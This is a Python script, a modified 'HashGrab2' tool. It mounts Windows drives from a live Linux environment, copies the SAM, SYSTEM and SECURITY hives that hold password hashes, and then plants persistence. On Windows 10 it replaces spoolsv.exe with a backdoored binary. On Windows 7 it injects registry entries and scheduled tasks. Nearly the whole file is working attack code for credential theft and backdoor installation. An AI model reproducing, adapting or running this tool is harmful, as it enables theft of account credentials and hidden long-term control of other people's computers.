#!/usr/bin/env python

shellLocation='shell_files'
import fnmatch
#########################################################################
# HashGrab2 automatically mounts any Windows drives it can find, and    #
# using samdump2 extracts username-password hashes from SAM and SYSTEM  #
# files located on the Windows drive, after which it writes them to     #
# user specified directory.                                             #
#                                                                       #
# Copyright (C) 2010 s3my0n                                             #
#                                                                       #
# This program is free software: you can redistribute it and/or modify  #
# it under the terms of the GNU General Public License as published by  #
# the Free Software Foundation, either version 3 of the License, or     #
# any later version.                                                    #
#                                                                       #
# This program is distributed in the hope that it will be useful,       #
# but WITHOUT ANY WARRANTY; without even the implied warranty of        #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         #
# GNU General Public License for more details.                          #
#                                                                       #
# You should have received a copy of the GNU General Public License     #
# along with this program.  If not, see <http://www.gnu.org/licenses/>. #
#########################################################################

import sys, os, random, shutil, re, subprocess
from time import sleep
from base64 import b64encode

Encrypt = os.path.isfile("/home/tc/public_key.pem") #if file exists, encrypt

class HashGrab(object):
    def __init__(self, basedir, filesystems=['HPFS/NTFS', 'FAT16/FAT32']):
        self.basedir = basedir
        self.filesystems = filesystems
        self.dirstocheck = ['/WINDOWS/System32/config/', '/Windows/System32/config/', '/WINNT/System32/config/', '/WINDOWS/system32/config/']
        self.files = ['SYSTEM', 'SAM', 'system','sam','SECURITY','security','SOFTWARE','software']
        self.ftocopy = []
        self.hashes = {}
        self.devs = []
        self.mountdirs = []
        self.samsystem_dirs = {}
        self.filestocopy = []
        
    def findPartitions(self):
        decider = subprocess.Popen(('whoami'), stdout=subprocess.PIPE).stdout
        decider = decider.read().strip()
        if decider != 'root':
            print '\n [-] Error: you are not root'
            sys.exit(1)
        else:
            ofdisk = subprocess.Popen(('fdisk', '-l'), stdout=subprocess.PIPE).stdout
            rfdisk = [i.strip() for i in ofdisk]
            ofdisk.close()
            for line in rfdisk:
                for f in self.filesystems:
                    if f in line:
                        dev = re.findall('/\w+/\w+\d+', line)
                        self.devs.append(dev[0])

    def mountPartitions(self):
        def randgen(integer):
            chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
            x = random.sample(chars, integer)
            randstring = ''.join(x)
            return randstring
        for dev in self.devs:
            mname = randgen(6)
            mdir = '/mnt/%s' % (mname)
            self.mountdirs.append([mdir, mname])
            os.mkdir(mdir)
            cmd = subprocess.call(('ntfs-3g', '-o remove_hiberfile', '%s'%(dev), '%s'%(mdir)))
            if cmd == 14:
                print '\n [-] Could not mount %s to %s: Trying ntfsfix and trying again' % (dev, mdir)
                cmd = subprocess.call(('ntfsfix','%s'%(dev)))
		cmd = subprocess.call(('ntfs-3g', '-o remove_hiberfile', '%s'%(dev), '%s'%(mdir)))
		if cmd ==14:
		    print '\n [-] Could not mount %s to %s: could not mount after ntfsfix. Trying other drives' % (dev, mdir)
            else:
                print '\n [*] Mounted %s to %s' % (dev, mdir)

    def findSamSystem(self):
        part_number = 0
        for m in self.mountdirs:
            self.filestocopy.append(m)
            for d in self.dirstocheck:
                for f in self.files:
                    cdir = '%s%s%s' % (m[0], d, f)
                    if os.path.isfile(cdir):
                        self.filestocopy[part_number].append(cdir)
            part_number+=1

    def copySamSystem(self):
        nmountdirs = len(self.mountdirs)
        decider = 0

        for f in self.filestocopy:
            if len(f) < 4:
                decider += 1
            else:
                self.ftocopy.append(f)
        if decider == nmountdirs:
            print '\n [-] Could not find SAM and SYSTEM files in %s' % (self.devs)
            self.cleanUp()
            sys.exit()
        else:
            print '\n [*] Copying SAM SYSTEM and SECURITY files...\n'
            aes_key = b64encode(os.urandom(32)).decode('utf-8')
            for f in self.ftocopy:
                cpdir = '%s%s' % (self.basedir, f[1])
                self.samsystem_dirs[f[1]] = cpdir
                os.mkdir(cpdir)
                if Encrypt:
                    subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[2], '-out', os.path.join(cpdir,'SYSTEM.enc'), '-k', aes_key])
                    subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[3], '-out', os.path.join(cpdir,'SAM.enc'), '-k', aes_key])
                    subprocess.call(['openssl', 'enc', '-aes-256-cbc', '-md', 'sha256', '-salt', '-in', f[4], '-out', os.path.join(cpdir,'SECURITY.enc'), '-k', aes_key])
                    echo_key = subprocess.Popen(('echo', aes_key), stdout=subprocess.PIPE)
                    output = subprocess.check_output(('openssl', 'rsautl', '-encrypt', '-inkey', 'public_key.pem', '-out', os.path.join(cpdir,'key.enc'), '-pubin'), stdin=echo_key.stdout)
                else:
                    shutil.copy(f[2], '%s/SYSTEM'%(cpdir))
                    shutil.copy(f[3], '%s/SAM'%(cpdir))
                    shutil.copy(f[4], '%s/SECURITY'%(cpdir))

    def identifyVersion(self):
	for f in self.ftocopy:        
		print "Identifying version"
		software = '%s' % (f[5])
		cmd = subprocess.Popen(['/home/tc/reged', '-x', software, 'HKEY_LOCAL_MACHINE\SOFTWARE','Microsoft\Windows NT\CurrentVersion', 'out.reg'], stdout=subprocess.PIPE);
		cmd.communicate()
		version = ""
		file = open("/home/tc/out.reg", "r")
		for line in file:
		    if re.search("Windows 7", line):
		        print "Windows 7 Identified"
		        version = "Windows 7"
			hg.insertShell(f[1],f[5]) #windows 7 -insert scheduled task
		        break
		    elif re.search("Windows 10", line):
		        print "Windows 10 Identified"
		        version = "Windows 10"
		        print f[1]
			hg.insertService(f[1]) #windows 10 -insert service.
			break
		print software
		# cleanup
		subprocess.Popen(['rm', '-f', '/home/tc/out.reg'])
        return version

    def insertService(self,spool):
        	print "Inserting Service"
        	spoolDir = '/mnt/%s/Windows/System32/' %(spool)
        	spoolBackdoor = '/home/tc/shell_files/win10/spoolsv.exe'
        	spoolOriginal = spoolDir + 'spoolsv.exe'
        	spoolBackup = spoolDir + 'spoolsv.exe.bak'
                shutil.copy(spoolOriginal,spoolBackup)
		shutil.copy(spoolBackdoor,spoolOriginal)		
	       	#print spoolOriginal
    
    #Insert shell currently used for windows 7		
    def insertShell(self,task,software):
            print "Inserting Shell"
            taskDir = '/mnt/%s/Windows/System32/Tasks' %(task)
            softwareDir = '%s' % (software)
            reged= '%s/reged' %(self.basedir)
            shellDir = "/home/tc/shell_files/win7"
            regfiles=os.listdir(shellDir);
            print regfiles
            for r in regfiles:
                r= '%s/%s' %(shellDir,r)
                if fnmatch.fnmatch(r,'*.reg'):
                    cmd= subprocess.Popen([reged,'-C','-I',softwareDir,'HKEY_LOCAL_MACHINE\SOFTWARE',r], stdout=subprocess.PIPE)
                    print cmd.stdout.read();
                else:
                    shutil.copy(r,taskDir)

    def cleanUp(self, devs=True, mdirs=True, cpdirs=False):
        if devs:
            print '\n [*] Unmounting partitions...'
            sleep(1) # sometimes fails if you don't sleep
            for dev in self.devs:
                subprocess.call(('umount', '%s'%(dev)))
        if mdirs:
            print '\n [*] Deleting mount directories...'
            for d in self.mountdirs:
                os.rmdir(d[0])

                
def about():
    return r'''
  _               _                     _    ___  
 | |             | |                   | |  |__ \ 
 | |__   __ _ ___| |__   __ _ _ __ __ _| |__   ) |
 | '_ \ / _` / __| '_ \ / _` | '__/ _` | '_ \ / / 
 | | | | (_| \__ \ | | | (_| | | | (_| | |_) / /_ 
 |_| |_|\__,_|___/_| |_|\__, |_|  \__,_|_.__/____|
                         __/ |                    
                        |___/

 HashGrab v2.0 by s3my0n, Modified by Mike Wrzesniak
 '''

if __name__=='__main__':
#    print about()

    basedir = './' #change hashes copy directory (include "/" at the end of path)

    decider = os.path.exists(basedir)
    if (decider == True) and (basedir[-1:] == '/'):
        hg = HashGrab(basedir)
        hg.findPartitions()
        hg.mountPartitions()
        hg.findSamSystem()
        hg.copySamSystem()
	hg.identifyVersion()
	hg.cleanUp()
    else:
        print '\n [-] Error: check your basedir'
        sys.exit(1)
